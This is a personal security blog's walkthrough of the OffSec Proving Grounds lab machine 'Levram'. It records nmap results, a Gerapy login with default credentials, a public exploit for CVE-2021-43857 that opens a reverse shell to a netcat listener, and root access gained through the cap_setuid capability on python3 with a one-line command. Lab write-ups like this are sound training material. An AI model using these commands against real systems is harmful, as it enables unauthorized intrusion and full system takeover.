@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Levram</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Levram | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Levram" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/07/Proving_grounds_Practice-Levram.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/07/Proving_grounds_Practice-Levram.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-07T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Levram" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-07T02:00:00+05:30","datePublished":"2023-10-07T02:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Play: Levram","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/07/Proving_grounds_Practice-Levram.html"},"url":"http://localhost:4000/2023/10/07/Proving_grounds_Practice-Levram.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/07/Proving_grounds_Practice-Levram.html">
+    <h2 class="post-title">Proving grounds Play: Levram</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 7, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9bc8f013f855df95cd9fbb615a01e74 (ECDSA)
+|_  256 53d97f3d228afd5798fe6b1a4cac7967 (ED25519)
+8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
+|_http-title: Gerapy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Date: Sat, 07 Oct 2023 11:16:52 GMT
+|     Server: WSGIServer/0.2 CPython/3.10.6
+|     Content-Type: text/html
+|     Content-Length: 9979
+|_    Vary: Origin
+</code></pre></div></div>
+
+<h2 id="8000tcp-open--http-alt-wsgiserver02-cpython3106">8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6</h2>
+
+<p>http://192.168.211.24:8000/#/login</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Levram/web.png" alt="img" /></p>
+
+<p>The application uses default credentials <code class="language-plaintext highlighter-rouge">admin:admin</code> and it is vulnerable to <a href="https://www.exploit-db.com/exploits/50640">Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)</a>.</p>
+
+<blockquote>
+  <p><strong>Note:</strong></p>
+
+  <p>If the application doesn’t have any projects the exploit will throw an error, a project must exist for the exploit to work properly.</p>
+</blockquote>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<p>Login to the application using the credentials and create a new project. Now run the exploit and ensure the netcat listener is running.</p>
+
+<p><strong>Exploitation</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|07:21|~/proving_grounds/Levram/exploit<span class="nv">$ </span>python2 exploit.py <span class="nt">-t</span> 192.168.211.24 <span class="nt">-p</span> 8000 <span class="nt">-L</span> 192.168.45.193 <span class="nt">-P</span> 4444
+  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
+ / ___<span class="se">\ \ </span>  / / ____|   |___ <span class="se">\ </span>/ _ <span class="se">\_</span>__ <span class="se">\/</span> |     | <span class="o">||</span> <span class="o">||</span>___ / <span class="o">(</span> _ <span class="o">)</span> ___|___  |
+| |    <span class="se">\ \ </span>/ /|  _| _____ __<span class="o">)</span> | | | |__<span class="o">)</span> | |_____| <span class="o">||</span> |_ |_ <span class="se">\ </span>/ _ <span class="se">\_</span>__ <span class="se">\ </span> / / 
+| |___  <span class="se">\ </span>V / | |__|_____/ __/| |_| / __/| |_____|__   _|__<span class="o">)</span> | <span class="o">(</span>_<span class="o">)</span> |__<span class="o">)</span> |/ /  
+ <span class="se">\_</span>___|  <span class="se">\_</span>/  |_____|   |_____|<span class="se">\_</span>__/_____|_|        |_||____/ <span class="se">\_</span>__/____//_/   
+                                                                              
+
+Exploit <span class="k">for </span>CVE-2021-43857
+For: Gerapy &lt; 0.9.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Resolving URL...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Logging <span class="k">in </span>to application...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Login successful! Proceeding...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the project list
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found project: <span class="nb">test</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the ID of the project to build the URL
+<span class="o">(</span><span class="s1">'[*] Found ID of the project: '</span>, 1<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting up a netcat listener
+listening on <span class="o">[</span>any] 4444 ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing reverse shell payload
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Watchout <span class="k">for </span>shell! :<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Reverse Shell Obtained</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|07:20|~/proving_grounds/Levram/exploit<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>192.168.45.193] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.211.24] 42252
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>845<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+app@ubuntu:~/gerapy<span class="err">$</span>
+</code></pre></div></div>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Check the extended capabilities in the system.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app@ubuntu:~/gerapy<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2/dev/null    <span class="c">#get the extended capabilites</span>
+/usr/bin/python3.10 <span class="nv">cap_setuid</span><span class="o">=</span>ep   <span class="c">#exploitable</span>
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app@ubuntu:/tmp<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>app<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>app<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example</a></li>
+  <li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a></li>
+</ul>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
